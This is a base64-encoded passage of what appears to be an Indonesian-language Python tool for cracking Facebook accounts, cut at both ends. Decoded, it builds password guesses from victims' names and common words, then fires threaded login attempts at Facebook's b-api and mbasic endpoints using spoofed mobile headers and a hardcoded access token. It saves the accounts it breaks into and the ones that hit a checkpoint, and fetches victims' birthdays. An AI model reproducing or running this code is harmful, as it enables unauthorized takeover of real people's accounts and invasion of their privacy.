heF93b3JrZXJzPTMwKSBhcyBjb2VnOg0KCQkJCQlzdGFydGVkKCkNCgkJCQkJZm9yIHVzZXIgaW4gaWQ6DQoJCQkJCQl1aWQsIG5hbWUgPSB1c2VyLnNwbGl0KCI8PT4iKQ0KCQkJCQkJZnJpc3Q9bmFtZS5zcGxpdCgiICIpDQoJCQkJCQlpZiBsZW4oZnJpc3QpPj02Og0KCQkJCQkJCWZpaSA9IFsgbmFtZSwgZnJpc3RbMF0sIGZyaXN0WzBdKyIxMjMiLCBmcmlzdFswXSsiMTIzNDUiLCBmcmlzdFswXSsiMTIzNDU2IiBdDQoJCQkJCQllbGlmIGxlbihmcmlzdCk8PTI6DQoJCQkJCQkJZmlpID0gWyBuYW1lLCBmcmlzdFswXSwgZnJpc3RbMF0rIjEyMyIsIGZyaXN0WzBdKyIxMjM0NSIsIGZyaXN0WzBdKyIxMjM0NTYiIF0NCgkJCQkJCWVsaWYgbGVuKGZyaXN0KTw9MzoNCgkJCQkJCQlmaWkgPSBbIG5hbWUsIGZyaXN0WzBdLCBmcmlzdFswXSsiMTIzIiwgZnJpc3RbMF0rIjEyMzQ1IiwgZnJpc3RbMF0rIjEyMzQ1NiIgXQ0KCQkJCQkJZWxzZToNCgkJCQkJCQlmaWkgPSBbICJiaXNtaWxsYWgiLCJzYXlhbmciLCJrYXRhc2FuZGkiLCJ0ZXJzZXJhaCIsImtvbnRvbCIsImFuamluZyIsImJhbmdzYXQnLCdiYWppbmdhbicsJ2phbmNvaycsJ21vbnlldCcsJ2luZG9uZXNpYSIgXQ0KCQkJCQkJY29lZy5zdWJtaXQobW9iaWxsLCB1aWQsIGZpaSkNCgkJCQlleGl0KCkNCgkJCQkNCgllbGlmIGZpaXNheWFuZ3dpZGl5YSBpbiBbIjIiLCIwMiJdOg0KCQlwcmludChmIntIfSAiKQ0KCQlwcmludChmIntIfSAiKQ0KCQlwcmludChmIntIfVvigKJdIFRhbXBpbGthbiBvcHNpIGNoZWtwb2ludCB7SX1ZL1QiKQ0KCQlqYWxhbihmIntIfVvigKJde0h9IFNBUkFOIEpBTkdBTiBUQU1QSUxLQU4gQklLSU4gQ1JBQ0sgTEFNQSBNT05ZRVQhISEiKQ0KCQlfY2hlY2tvcHRpb25zXz1pbnB1dChmIntIfVvigKJdIFBpbGloIDoge0l9IikNCgkJaWYgX2NoZWNrb3B0aW9uc18gaW4gWyJ5IiwiWSJdOg0KCQkJdHJ5Og0KCQkJCV9rZXkgPSAiQW5qaW5rIg0KCQkJCWtleSA9ICJBbmppbmsiDQoJCQkJaWYgX2tleSBpbiBrZXk6DQoJCQkJCXByaW50KGYie0h9ICIpDQoJCQkJCXByaW50KGYie0h9W+KAol0gQ3JhY2sgbWVuZ2d1bmFrYW4gcGFzc3dvcmQgbWFudWFsL2RlZmF1bHQge0l9TS9EIikNCgkJCQkJdGVyID1pbnB1dChmIntIfVvigKJdIFBpbGloIDoge0l9IikNCgkJCQkJaWYgdGVyIGluIFsibSIsIk0iXToNCgkJCQkJCXdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPTMwKSBhcyBjb2VnOg0KCQkJCQkJCXByaW50KGYie0J9ICIpDQoJCQkJCQkJcHJpbnQoZiJ7SH1b4oCiXSBDb250b2ggcGFzc3dvcmQgOiB7SX1zYXlhbmcsbmdlbnRvdHl1ayIpDQoJCQkJCQkJcHJpbnQoZiJ7SH0gIikNCgkJCQkJCQlhc3UgPSBpbnB1dChmIntIfVvigKJdIEJ1YXQgc2FuZGkgOiB7Qn0gIikuc3BsaXQoIiwiKQ0KCQkJCQkJCWlmIGxlbihhc3UpID09IiI6DQoJCQkJCQkJCXByaW50KGYie0h9ICIpDQoJCQkJCQkJCXByaW50KGYie0h9W+KAol17S30gU2FuZGkgdGlkYWsgYm9sZWgga29zb25nIGFuamluayIpO2V4aXQoKQ0KCQkJCQkJCXN0YXJ0ZWQoKQ0KCQkJCQkJCWZvciB1c2VyIGluIGlkOg0KCQkJCQkJCQl1aWQsIG5hbWUgPSB1c2VyLnNwbGl0KCI8PT4iKQ0KCQkJCQkJCQljb2VnLnN1Ym1pdChtYmFzaWMsIHVpZCwgYXN1KQ0KCQkJCQkJZXhpdCgpDQoJCQkJCWVsaWYgdGVyIGluIFsiZCIsIkQiXToNCgkJCQkJCXdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPTMwKSBhcyBjb2VnOg0KCQkJCQkJCXN0YXJ0ZWQoKQ0KCQkJCQkJCWZvciB1c2VyIGluIGlkOg0KCQkJCQkJCQl1aWQsIG5hbWUgPSB1c2VyLnNwbGl0KCI8PT4iKQ0KCQkJCQkJCQlmcmlzdD1uYW1lLnNwbGl0KCIgIikNCgkJCQkJCQkJaWYgbGVuKGZyaXN0KT49NjoNCgkJCQkJCQkJCWZpaSA9IFsgbmFtZSwgZnJpc3RbMF0sIGZyaXN0WzBdKyIxMjMiLCBmcmlzdFswXSsiMTIzNDUiLCBmcmlzdFswXSsiMTIzNDU2IiBdDQoJCQkJCQkJCWVsaWYgbGVuKGZyaXN0KTw9MjoNCgkJCQkJCQkJCWZpaSA9IFsgbmFtZSwgZnJpc3RbMF0sIGZyaXN0WzBdKyIxMjMiLCBmcmlzdFswXSsiMTIzNDUiLCBmcmlzdFswXSsiMTIzNDU2IiBdDQoJCQkJCQkJCWVsaWYgbGVuKGZyaXN0KTw9MzoNCgkJCQkJCQkJCWZpaSA9IFsgbmFtZSwgZnJpc3RbMF0sIGZyaXN0WzBdKyIxMjMiLCBmcmlzdFswXSsiMTIzNDUiLCBmcmlzdFswXSsiMTIzNDU2IiBdDQoJCQkJCQkJCWVsc2U6DQoJCQkJCQkJCQlmaWkgPSBbICJiaXNtaWxsYWgiLCJzYXlhbmciLCJrYXRhc2FuZGkiLCJ0ZXJzZXJhaCIsImtvbnRvbCIsImFuamluZyIsImJhbmdzYXQnLCdiYWppbmdhbicsJ2phbmNvaycsJ21vbnlldCcsJ2luZG9uZXNpYSIgXQ0KCQkJCQkJCQljb2VnLnN1Ym1pdChtYmFzaWMsIHVpZCwgZmlpKQ0KCQkJCQkJZXhpdCgpDQoJCQkJZWxzZTpwcmludChmIntrZXl9Iik7ZXhpdCgpDQoJCQlleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOnByaW50KGYie19rZXl9Iik7ZXhpdCgpDQoNCgkJZWxzZToNCgkJCXByaW50KGYie0h9ICIpDQoJCQlwcmludChmIntIfSAiKQ0KCQkJcHJpbnQoZiJ7SH1b4oCiXSBDcmFjayBtZW5nZ3VuYWthbiBwYXN3b3JkIG1hbnVhbC9kZWZhdWx0cyB7SX1NL0QiKQ0KCQkJdGVyID1pbnB1dChmIntIfVvigKJdIFBpbGloIDoge0l9IikNCgkJCWlmIHRlciBpbiBbIm0iLCJNIl06DQoJCQkJd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIGNvZWc6DQoJCQkJCXByaW50KGYie0J9ICIpDQoJCQkJCXByaW50KGYie0J9ICIpDQoJCQkJCXByaW50KGYie0h9W+KAol0gQ29udG9oIHBhc3N3b3JkIHtJfUFuamluayxzYXlhbmcsbmdlbnRvdHl1ayIpDQoJCQkJCXByaW50KGYie0h9ICIpDQoJCQkJCWFzdSA9IGlucHV0KGYie0h9W+KAol0gQnVhdCBzYW5kaSA6IHtJfSIpLnNwbGl0KCIsIikNCgkJCQkJaWYgbGVuKGFzdSkgPT0iIjoNCgkJCQkJCXByaW50KGYie0h9ICIpDQoJCQkJCQlwcmludChmIntIfVvigKJde0t9IFNhbmRpIHRpZGFrIGJvbGVoIGtvc29uZyIpO2V4aXQoKQ0KCQkJCQlzdGFydGVkKCkNCgkJCQkJZm9yIHVzZXIgaW4gaWQ6DQoJCQkJCQl1aWQsIG5hbWUgPSB1c2VyLnNwbGl0KCI8PT4iKQ0KCQkJCQkJY29lZy5zdWJtaXQobWJhc2ljYywgdWlkLCBhc3UpDQoJCQkJZXhpdCgpDQoJCQllbGlmIHRlciBpbiBbImQiLCJEIl06DQoJCQkJd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIGNvZWc6DQoJCQkJCXN0YXJ0ZWQoKQ0KCQkJCQlmb3IgdXNlciBpbiBpZDoNCgkJCQkJCXVpZCwgbmFtZSA9IHVzZXIuc3BsaXQoIjw9PiIpDQoJCQkJCQlmcmlzdD1uYW1lLnNwbGl0KCIgIikNCgkJCQkJCWlmIGxlbihmcmlzdCk+PTY6DQoJCQkJCQkJZmlpID0gWyBuYW1lLCBmcmlzdFswXSwgZnJpc3RbMF0rIjEyMyIsIGZyaXN0WzBdKyIxMjM0NSIsIGZyaXN0WzBdKyIxMjM0NTYiIF0NCgkJCQkJCWVsaWYgbGVuKGZyaXN0KTw9MjoNCgkJCQkJCQlmaWkgPSBbIG5hbWUsIGZyaXN0WzBdLCBmcmlzdFswXSsiMTIzIiwgZnJpc3RbMF0rIjEyMzQ1IiwgZnJpc3RbMF0rIjEyMzQ1NiIgXQ0KCQkJCQkJZWxpZiBsZW4oZnJpc3QpPD0zOg0KCQkJCQkJCWZpaSA9IFsgbmFtZSwgZnJpc3RbMF0sIGZyaXN0WzBdKyIxMjMiLCBmcmlzdFswXSsiMTIzNDUiLCBmcmlzdFswXSsiMTIzNDU2IiBdDQoJCQkJCQllbHNlOg0KCQkJCQkJCWZpaSA9IFsgImJpc21pbGxhaCIsInNheWFuZyIsImthdGFzYW5kaSIsInRlcnNlcmFoIiwia29udG9sIiwiYW5qaW5nIiwiYmFuZ3NhdCcsJ2JhamluZ2FuJywnamFuY29rJywnbW9ueWV0JywnaW5kb25lc2lhIiBdDQoJCQkJCQljb2VnLnN1Ym1pdChtYmFzaWNjLCB1aWQsIGZpaSkNCgkJCQlleGl0KCkNCgkJCQkNCmRlZiBrb25lKCk6DQogICAgcHJpbnQoZiJ7Qn0gIikNCiAgICBwcmludChmIntCfSAiKQ0KICAgIHByaW50KGYie0h9WzFdIEInLUFwaSDjgIrjgIt7SX1LT05UT0wtQ0VQQVQiKQ0KICAgIHByaW50KGYie0h9WzJdIE1iYXNpYyDjgIrjgIt7S31NRU1FSy1TRURBTkciKQ0KICAgIHByaW50KGYie0h9WzNdIE1vYmlsZSDjgIrjgIt7SH1OR0VOVE9ULVBFTEFOIikNCg0KZGVmIHN0YXJ0ZWQoKToNCiAgICBwcmludChmIntCfSAiKQ0KICAgIHByaW50KGYie0J9ICIpDQogICAgcHJpbnQoZiJ7SH1b4oCiXXtIfSBSZXN1bHRzIHtJfW9rIHtIfXRlcnNpbXBhbiBkaSB7SX1vay97dGFuZ2dhbH0iKQ0KICAgIHByaW50KGYie0h9W+KAol17SH0gUmVzdWx0cyB7S31jcCB7SH10ZXJzaW1wYW4gZGkge0t9Y3Ave3RhbmdnYWx9IikNCiAgICBwcmludChmIntIfVvigKJdIE9OL09GRiBNT0RFIFBFU0FXQVQgNSBERVRJSyBTRVRJQVAgNTAwIElEIE1PTllFVCEhIikNCiAgICBwcmludChmIntCfSB7SX0iKQ0KDQpkZWYgYXBpKHVpZCwgZmlpKToNCiAgICB0cnk6DQogICAgICAgIHVhID0gb3BlbigidWEiLCAiciIpLnJlYWQoKQ0KICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICB1YSA9ICJTdXBwb3J0c0ZyZXNjbz0xIERhbHZpay8yLjEuMCAoTGludXg7IFU7IEFuZHJvaWQgNi4wLjE7IFNNLUoyMTBGIEJ1aWxkL01NQjI5USkgU291cmNlLzEgW0ZCQU4vRU1BO1VOSVRZX1BBQ0tBR0UvMzQyO0ZCQlYvMTA3NTg2NzA2O0ZCQVYvMTcyLjAuMC44LjE4MjtGQkRWL1NNLUoyMTBGO0ZCTEMvZW5fVVM7RkJPUC8yMF0iDQogICAgZ2xvYmFsIG9rLCBjcCwgbG9vcCwgdG9rZW4sIGNvb2tpZQ0KICAgIHN5cy5zdGRvdXQud3JpdGUoZiJccntIfVvigKJdIHzilaTilrrilaTilroge0h9IHtsb29wfS97bGVuKGlkKX0ge0l9T0sgOiB7SX17bGVuKG9rKX0ge0t9Q1AgOiB7S317bGVuKGNwKX0iKTtzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICBmb3IgcHcgaW4gZmlpOg0KICAgICAgICBwdyA9IHB3Lmxvd2VyKCkNCiAgICAgICAgaGVhZGVyc18gPSB7IngtZmItY29ubmVjdGlvbi1iYW5kd2lkdGgiOiBzdHIocmFuZG9tLnJhbmRpbnQoMjAwMDAwMDAuMCwgMzAwMDAwMDAuMCkpLCAieC1mYi1zaW0taG5pIjogc3RyKHJhbmRvbS5yYW5kaW50KDIwMDAwLCA0MDAwMCkpLCAieC1mYi1uZXQtaG5pIjogc3RyKHJhbmRvbS5yYW5kaW50KDIwMDAwLCA0MDAwMCkpLCAieC1mYi1jb25uZWN0aW9uLXF1YWxpdHkiOiAiRVhDRUxMRU5UIiwgIngtZmItY29ubmVjdGlvbi10eXBlIjogImNlbGwuQ1RSYWRpb0FjY2Vzc1RlY2hub2xvZ3lIU0RQQSIsICJ1c2VyLWFnZW50IjogdWEsICJjb250ZW50LXR5cGUiOiAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIiwgIngtZmItaHR0cC1lbmdpbmUiOiAiTGlnZXIifQ0KICAgICAgICBzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICAgICAgc2VuZCA9IHNlcy5nZXQoImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2Zvcm1hdD1qc29uJmVtYWlsPSIrc3RyKHVpZCkrIiZwYXNzd29yZD0iK3N0cihwdykrIiZjcmVkZW50aWFsc190eXBlPWRldmljZV9iYXNlZF9sb2dpbl9wYXNzd29yZCZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZlcnJvcl9kZXRhaWxfdHlwZT1idXR0b25fd2l0aF9kaXNhYmxlZCZzb3VyY2U9ZGV2aWNlX2Jhc2VkX2xvZ2luJm1ldGFfaW5mX2ZibWV0YT0lMjAmY3VycmVudGx5X2xvZ2dlZF9pbmxvbG9saWQ9MCZtZXRob2Q9R0VUJmxvY2FsZT1lbl9VUyZjbGllbnRfY291bnRyeV9jb2RlPVVTJmZiX2FwaV9jYWxsZXJfY2xhc3M9Y29tLmZhY2Vib29rLmZvcy5oZWFkZXJzdjIuZmI0YW9yY2EuSGVhZGVyc1YyQ29uZmlnRmV0Y2hSZXF1ZXN0SGFuZGxlciZhY2Nlc3NfdG9rZW49MzUwNjg1NTMxNzI4fDYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyJmZiX2FwaV9yZXFfZnJpZW5kbHlfbmFtZT1hdXRoZW50aWNhdGUmY3BsPXRydWUiLCBoZWFkZXJzPWhlYWRlcnNfKQ0KICAgICAgICBpZiAic2Vzc2lvbl9rZXkiIGluIHNlbmQudGV4dCBhbmQgIkVBQUEiIGluIHNlbmQudGV4dDoNCiAgICAgICAgICAgIHByaW50KGYiXHJ7SH0gfOKVpOKWuuKVpOKWuiB7SX17dWlkfeKAontwd30iKQ0KICAgICAgICAgICAgb2suYXBwZW5kKCIlc3wlcyIlKHVpZCwgcHcpKQ0KICAgICAgICAgICAgb3BlbigiT0svJXMuanNvbiIlKHRhbmdnYWwpLCJhIikud3JpdGUoIiVzfCVzXG4iJSh1aWQsIHB3KSkNCiAgICAgICAgICAgIGJyZWFrDQogICAgICAgIGVsaWYgInd3dy5mYWNlYm9vay5jb20iIGluIHNlbmQuanNvbigpWyJlcnJvcl9tc2ciXToNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICB0b2tlbiAgPSBvcGVuKCdsb2dpbi90b2tlbi5qc29uJywncicpLnJlYWQoKQ0KICAgICAgICAgICAgICAgIGNvb2tpZSA9IHsnY29va2llJzpvcGVuKCdsb2dpbi9jb29raWUuanNvbicsJ3InKS5yZWFkKCl9DQogICAgICAgICAgICAgICAgdHRsID0gc2VzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXM/YWNjZXNzX3Rva2VuPSVzIiUodWlkLCB0b2tlbiksY29va2llcz1jb29raWUpLmpzb24oKVsiYmlydGhkYXkiXQ0KICAgICAgICAgICAgICAgIG1vbnRoLCBkYXksIHllYXIgPSB0dGwuc3BsaXQoIi8iKQ0KICAgICAgICAgICAgICAgIG1vbnRoID0gX2J1bGFuX1ttb250aF0NCiAgICAgICAgICAgICAgICBwcmludChmIlxye0h9IHzilaTilrrilaTilroge0t9e3VpZH3igKJ7cHd94oCie2RheX0ge21vbnRofSB7eWVhcn0iKQ0KICAgICAgICAgICAgICAgIGNwLmFwcGVuZCgiJXN8JXMiJSh1aWQsIHB3KSkNCiAgICAgICAgICAgICAgICBvcGVuKCJDUC8lcy5qc29uIiUodGFuZ2dhbCksImEiKS53cml0ZSgiJXN8JXN8JXMgJXMgJXNcbiIlKHVpZCwgcHcsIGRheSwgbW9udGgsIHllYXIpKQ0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICBleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToNCiAgICAgICAgICAgICAgICBkYXkgPSAoIiAiKQ0KICAgICAgICAgICAgICAgIG1vbnRoID0gKCIgIikNCiAgICAgICAgICAgICAgICB5ZWFyID0gKCIgIikNCiAgICAgICAgICAgIGV4Y2VwdDpwYXNzDQogICAgICAgICAgICBjZWtfbG9nKHVpZCxwdyx1YSkNCiAgICAgICAgICAgIHByaW50KGYiXHJ7SX0gfOKVpOKWuuKVpOKWuiB7S317dWlkfeKAontwd30iKQ0KICAgICAgICAgICAgY3AuYXBwZW5kKCIlc3wlcyIlKHVpZCwgcHcpKQ0KICAgICAgICAgICAgb3BlbigiQ1AvJXMuanNvbiIlKHRhbmdnYWwpLCJhIikud3JpdGUoIiVzfCVzXG4iJSh1aWQsIHB3KSkNCiAgICAgICAgICAgIGJyZWFrDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBjb250aW51ZQ0KDQogICAgbG9vcCArPSAxDQoNCmRlZiBhcGlpaWkodWlkLCBmaWkpOg0KICAgIHRyeToNCiAgICAgICAgdWEgPSBvcGVuKCJ1YSIsICJyIikucmVhZCgpDQogICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgIHVhID0gIlN1cHBvcnRzRnJlc2NvPTEgRGFsdmlrLzIuMS4wIChMaW51eDsgVTsgQW5kcm9pZCA2LjAuMTsgU00tSjIxMEYgQnVpbGQvTU1CMjlRKSBTb3VyY2UvMSBbRkJBTi9FTUE7VU5JVFlfUEFDS0FHRS8zNDI7RkJCVi8xMDc1ODY3MDY7RkJBVi8xNzIuMC4wLjguMTgyO0ZCRFYvU00tSjIxMEY7RkJMQy9lbl9VUztGQk9QLzIwXSINCiAgICBnbG9iYWwgb2ssIGNwLCBsb29wLCB0b2tlbiwgY29va2llDQoNCiAgICBzeXMuc3Rkb3V0LndyaXRlKGYiXHJ7SH1b4oCiXSB84pWk4pa64pWk4pa6IHtIfSB7bG9vcH0ve2xlbihpZCl9IHtJfU9LIDoge0l9e2xlbihvayl9IHtLfUNQIDoge0t9e2xlbihjcCl9Iik7c3lzLnN0ZG91dC5mbHVzaCgpDQogICAgZm9yIHB3IGluIGZpaToNCiAgICAgICAgcHcgPSBwdy5sb3dlcigpDQogICAgICAgIGhlYWRlcnNfID0geyJ4LWZiLWNvbm5lY3Rpb24tYmFuZHdpZHRoIjogc3RyKHJhbmRvbS5yYW5kaW50KDIwMDAwMDAwLjAsIDMwMDAwMDAwLjApKSwgIngtZmItc2ltLWhuaSI6IHN0cihyYW5kb20ucmFuZGludCgyMDAwMCwgNDAwMDApKSwgIngtZmItbmV0LWhuaSI6IHN0cihyYW5kb20ucmFuZGludCgyMDAwMCwgNDAwMDApKSwgIngtZmItY29ubmVjdGlvbi1xdWFsaXR5IjogIkVYQ0VMTEVOVCIsICJ4LWZiLWNvbm5lY3Rpb24tdHlwZSI6ICJjZWxsLkNUUmFkaW9BY2Nlc3NUZWNobm9sb2d5SFNEUEEiLCAidXNlci1hZ2VudCI6IHVhLCAiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsICJ4LWZiLWh0dHAtZW5naW5lIjogIkxpZ2VyIn0NCiAgICAgICAgc2VzID0gcmVxdWVzdHMuU2Vzc2lvbigpDQogICAgICAgIHNlbmQgPSBzZXMuZ2V0KCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9mb3JtYXQ9anNvbiZlbWFpbD0iK3N0cih1aWQpKyImcGFzc3dvcmQ9IitzdHIocHcpKyImY3JlZGVudGlhbHNfdHlwZT1kZXZpY2VfYmFzZWRfbG9naW5fcGFzc3dvcmQmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmZXJyb3JfZGV0YWlsX3R5cGU9YnV0dG9uX3dpdGhfZGlzYWJsZWQmc291cmNlPWRldmljZV9iYXNlZF9sb2dpbiZtZXRhX2luZl9mYm1ldGE9JTIwJmN1cnJlbnRseV9sb2dnZWRfaW5sb2xvbGlkPTAmbWV0aG9kPUdFVCZsb2NhbGU9ZW5fVVMmY2xpZW50X2NvdW50cnlfY29kZT1VUyZmYl9hcGlfY2FsbGVyX2NsYXNzPWNvbS5mYWNlYm9vay5mb3MuaGVhZGVyc3YyLmZiNGFvcmNhLkhlYWRlcnNWMkNvbmZpZ0ZldGNoUmVxdWVzdEhhbmRsZXImYWNjZXNzX3Rva2VuPTM1MDY4NTUzMTcyOHw2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMiZmYl9hcGlfcmVxX2ZyaWVuZGx5X25hbWU9YXV0aGVudGljYXRlJmNwbD10cnVlIiwgaGVhZGVycz1oZWFkZXJzXykNCiAgICAgICAgaWYgInNlc3Npb25fa2V5IiBpbiBzZW5kLnRleHQgYW5kICJFQUFBIiBpbiBzZW5kLnRleHQ6DQogICAgICAgICAgICBwcmludChmIlxye0l9IHzilaTilrrilaTilroge0l9e3VpZH3igKJ7cHd9IikNCiAgICAgICAgICAgIG9rLmFwcGVuZCgiJXN8JXMiJSh1aWQsIHB3KSkNCiAgICAgICAgICAgIG9wZW4oIk9LLyVzLmpzb24iJSh0YW5nZ2FsKSwiYSIpLndyaXRlKCIlc3wlc1xuIiUodWlkLCBwdykpDQogICAgICAgICAgICBicmVhaw0KICAgICAgICBlbGlmICJ3d3cuZmFjZWJvb2suY29tIiBpbiBzZW5kLmpzb24oKVsiZXJyb3JfbXNnIl06DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgdG9rZW4gID0gb3BlbignbG9naW4vdG9rZW4uanNvbicsJ3InKS5yZWFkKCkNCiAgICAgICAgICAgICAgICBjb29raWUgPSB7J2Nvb2tpZSc6b3BlbignbG9naW4vY29va2llLmpzb24nLCdyJykucmVhZCgpfQ0KICAgICAgICAgICAgICAgIHR0bCA9IHNlcy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzP2FjY2Vzc190b2tlbj0lcyIlKHVpZCwgdG9rZW4pLGNvb2tpZXM9Y29va2llKS5qc29uKClbImJpcnRoZGF5Il0NCiAgICAgICAgICAgICAgICBtb250aCwgZGF5LCB5ZWFyID0gdHRsLnNwbGl0KCIvIikNCiAgICAgICAgICAgICAgICBtb250aCA9IF9idWxhbl9bbW9udGhdDQogICAgICAgICAgICAgICAgcHJpbnQoZiJccntJfSB84pWk4pa64pWk4pa6IHtLfXt1aWR94oCie3B3feKAontkYXl9IHttb250fSB7eWVhcn0iKQ0KICAgICAgICAgICAgICAgIGNwLmFwcGVuZCgiJXN8JXMiJSh1aWQsIHB3KSkNCiAgICAgICAgICAgICAgICBvcGVuKCJDUC8lcy5qc29uJSIodGFuZ2dhbCksImEiKS53cml0ZSgiJXN8JXN8JXMgJXMgJXNcbiIlKHVpZCwgcHcsIGRheSwgbW9udGgsIHllYXIpKQ0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICBleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToNCiAgICAgICAgICAgICAgICBkYXkgPSAoIiAiKQ0KICAgICAgICAgICAgICAgIG1vbnRoID0gKCIgIikNCiAgICAgICAgICAgICAgICB5ZWFyID0gKCIgIikNCiAgICAgICAgICAgIGV4Y2VwdDpwYXNzDQogICAgICAgICAgICBwcmludChmIlxye0l9IHzilaTilrrilaTilroge0t9e3VpZH3igKJ7cHd9IikNCiAgICAgICAgICAgIGNwLmFwcGVuZCgiJXN8JXMiJSh1aWQsIHB3KSkNCiAgICAgICAgICAgIG9wZW4oIkNQLyVzLmpzb24iJSh0YW5nZ2FsKSwiYSIpLndyaXRlKCIlc3wlc1xuIiUodWlkLCBwdykpDQogICAgICAgICAgICBicmVhaw0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgY29udGludWUNCg0KICAgIGxvb3AgKz0gMQ0KDQpkZWYgbWJhc2ljKHVpZCwgZmlpKToNCgl0cnk6DQoJCXVhID0gb3BlbigidWEiLCAiciIpLnJlYWQoKQ0KCWV4Y2VwdCBJT0Vycm9yOg0KCQl1YSA9ICJTdXBwb3J0c0ZyZXNjbz0xIERhbHZpay8yLjEuMCAoTGludXg7IFU7IEFuZHJvaWQgNi4wLjE7IFNNLUoyMTBGIEJ1aWxkL01NQjI5USkgU291cmNlLzEgW0ZCQU4vRU1BO1VOSVRZX1BBQ0tBR0UvMzQyO0ZCQlYvMTA3NTg2NzA2O0ZCQVYvMTcyLjAuMC44LjE4MjtGQkRWL1NNLUoyMTBGO0ZCTEMvZW5fVVM7RkJPUC8yMF0iDQoJZ2xvYmFsIG9rLCBjcCwgbG9vcCwgdG9rZW4sIGNvb2tpZQ0KCXN5cy5zdGRvdXQud3JpdGUoZiJccntIfVvigKJdIHzilaTilrrilaTilroge0h9IHtsb29wfS97bGVuKGlkKX0ge0l9T0sgOiB7SX17bGVuKG9rKX0ge0t9Q1AgOiB7S317bGVuKGNwKX0iKTtzeXMuc3Rkb3V0LmZsdXNoKCkNCglmb3IgcHcgaW4gZmlpOg0KCQlmaWlfZ3RnID0ge30NCgkJcHcgPSBwdy5sb3dlcigpDQoJCXNlcyA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KCQlzZXMuaGVhZGVycy51cGRhdGUoeyJvcmlnaW4iOiAiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tIiwgImFjY2VwdC1sYW5ndWFnZSI6ICJpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNyIsICJhY2NlcHQtZW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSIsICJhY2NlcHQiOiAidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCIsICJ1c2VyLWFnZW50IjogdWEsICJIb3N0IjogIm1iYXNpYy5mYWNlYm9vay5jb20iLCAicmVmZXJlciI6ICJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vbG9naW4vP25leHQmcmVmPWRibCZmbCZyZWZpZD04IiwgImNhY2hlLWNvbnRyb2wiOiAibWF4LWFnZT0wIiwgInVwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMiOiAiMSIsICJjb250ZW50LXR5cGUiOiAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIn0pDQoJCXAgPSBzZXMuZ2V0KCJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vbG9naW4vP25leHQmcmVmPWRibCZyZWZpZD04IikudGV4dA0KCQliID0gcGFyc2VyKHAsImh0bWwucGFyc2VyIikNCgkJYmwgPSBbImxzZCIsImphem9lc3QiLCJtX3RzIiwibGkiLCJ0cnlfbnVtYmVyIiwidW5yZWNvZ25pemVkX3RyaWVzIiwibG9naW4iXQ0KCQlmb3IgaSBpbiBiKCJpbnB1dCIpOg0KCQkJdHJ5Og0KCQkJCWlmIGkuZ2V0KCJuYW1lIikgaW4gYmw6ZmlpX2d0Zy51cGRhdGUoe2kuZ2V0KCJuYW1lIik6aS5nZXQoInZhbHVlIil9KQ0KCQkJCWVsc2U6Y29udGludWUNCgkJCWV4Y2VwdDpwYXNzDQoJCWZpaV9ndGcudXBkYXRlKHsiZW1haWwiOiB1aWQsInBhc3MiOiBwdywicHJlZmlsbF9jb250YWN0X3BvaW50IjogIiIsInByZWZpbGxfc291cmNlIjogIiIsInByZWZpbGxfdHlwZSI6ICIiLCJmaXJzdF9wcmVmaWxsX3NvdXJjZSI6ICIiLCJmaXJzdF9wcmVmaWxsX3R5cGUiOiAiIiwiaGFkX2NwX3ByZWZpbGxlZCI6ICJmYWxzZSIsImhhZF9wYXNzd29yZF9wcmVmaWxsZWQiOiAiZmFsc2UiLCJpc19zbWFydF9sb2NrIjogImZhbHNlIiwiX2ZiX25vc2NyaXB0IjogInRydWUifSkNCgkJZGVrdSA9IHNlcy5wb3N0KCJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vP3JlZnNyYz1odHRwcyUzQSUyRiUyRm1iYXNpYy5mYWNlYm9vay5jb20lMkYmbHd2PTEwMCZyZWZpZD04IixkYXRhPWZpaV9ndGcpDQoJCWlmICJjX3VzZXIiIGluIHNlcy5jb29ra